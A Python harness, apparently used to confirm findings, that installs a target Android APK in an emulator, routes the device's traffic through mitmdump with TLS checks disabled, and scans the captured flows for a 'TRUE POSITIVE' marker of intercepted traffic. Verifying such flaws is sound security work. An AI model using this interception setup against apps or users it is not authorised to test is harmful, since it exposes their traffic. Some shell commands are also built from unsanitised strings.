#!/usr/bin/env python3

import argparse
import os
import shutil
import time
import subprocess as subp
from androguard.core.apk import APK

IP_ADDRESS = os.getenv("PROXY_IP") or "192.168.1.50"
PORT = os.getenv("PROXY_PORT") or "8082"
ANDROID_AVD = os.getenv("ANDROID_AVD") or "Medium_Phone"
VERBOSITY = 3

def check_tp(logs=None):
    if "TRUE POSITIVE" in logs:
        return True
    else:
        return False
    
def enable_proxy(ip, port):
    print(f"Setting proxy to {ip}:{port}...")
    subp.run(["adb", "shell", "settings", "put", "global", "http_proxy", f"{ip}:{port}"], stdout=subp.DEVNULL, stderr=subp.DEVNULL)
    # Double-check verify
    current = subp.run(["adb", "shell", "settings", "get", "global", "http_proxy"], capture_output=True)
    print(f"Current Proxy Status: {current.stdout.decode().strip()}")

def disable_proxy():
    print("Disabling proxy...")
    subp.run(["adb", "shell", "settings", "delete", "global", "http_proxy"])
    subp.run(["adb", "shell", "settings", "delete", "global", "global_http_proxy_host"])
    subp.run(["adb","shell", "settings", "delete", "global", "global_http_proxy_port"])
    print("Proxy cleared.")
    
def capture_traffic(duration_seconds=60, output_file="traffic.mitm"):
    print(f"Starting mitmdump capture for {duration_seconds} seconds...")
    
    process = subp.Popen(
        ["mitmdump","-s", "dns_mitm.py", "-w", output_file, "-p", PORT, "--ssl-insecure", "--flow-detail", str(VERBOSITY)]
    )

    while True:
        ok = input("Press Enter to stop capture...")
        if len(ok) == 0:
            process.terminate()
            process.wait()
            print(f"Capture complete. Data saved to {output_file}")
            return

def extract_flows(flow_file):
    print("\n--- Captured Flow Summary ---")
    try:
        result = subp.check_output(["mitmdump", "-n", "-r", flow_file, "--flow-detail", str(VERBOSITY)])
        print(result.decode())
        return result.decode()
    except subp.CalledProcessError:
        print("Could not read flow file. Make sure mitmproxy is installed.")
        return ""
    
def verify():
    logs = ""
    try:
        echo_server = subp.Popen(
            ["./tls_echo_server.py"],
            stdout=subp.PIPE,
            stderr=subp.PIPE
        )
        capture_traffic()
    except KeyboardInterrupt:
        print("\nCapture interrupted by user.")
    finally:
        echo_server.terminate()
        echo_server.wait()
        logs = extract_flows("traffic.mitm")
        print(f"Captured logs:\n{logs}")
    return 0 if check_tp(logs) else 1

def launch_app(apk):
    print("Lauching the app")
    mainactivity = "{}/{}".format(apk.get_package(), apk.get_main_activity())
    os.system("adb shell am start -n {act}".format(act=mainactivity))

def uninstall(apk):
    if (os.system("adb shell pm list packages | grep {package}".format(package=apk.get_package())) == 0):
        print("Uninstalling the app")
        subp.call(["adb", "uninstall", apk.get_package()], stdout=subp.DEVNULL)

def install(apk):
    if (os.system("adb shell pm list packages | grep {package}".format(package=apk.get_package())) == 0):
        print("App already installed")
        return
    print("Installing the app")
    while True:
        try:
            os.system("adb install -g {apk}".format(apk=apk.get_filename()))
            break
        except subp.CalledProcessError as err:
            print('[!] install failed')
            print(err)
            print('[!] retrying')

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("victim", help="path to the victim's app apk file")
    parser.add_argument("avd", help="the name of the avd to use (default: Medium_Phone)", default=ANDROID_AVD)
    parser.add_argument("--manual","-m",action="store_true", help="if set to true, the script will wait for the user to press enter before starting the exploit")
    parser.add_argument("-ip", "--proxy-ip", help="the IP address of the proxy to use (default: {})".format(IP_ADDRESS), default=IP_ADDRESS)
    parser.add_argument("-port", "--proxy-port", help="the port of the proxy to use (default: {})".format(PORT), default=PORT)
    args = parser.parse_args()
    return args

def main(args):
    
    victimApk = APK(args.victim)
    print("Building the application...")
    os.chdir("./mitm")
    print("Lauching the emulator")
    os.system("emulator -avd {} -no-audio -no-boot-anim &".format(args.avd))
    if args.manual:
        input("Press Enter once the emulator is fully booted...")
    else:
        time.sleep(30)
    install(victimApk)
    enable_proxy(args.proxy_ip, args.proxy_port)
    subp.call(["adb", "logcat", "-c"])
    launch_app(victimApk)
    ret_code = verify()
    disable_proxy()
    if ret_code == 0:
        print("True positive detected!")
    return ret_code

if __name__ == "__main__":
    exit(main(parse_args()))
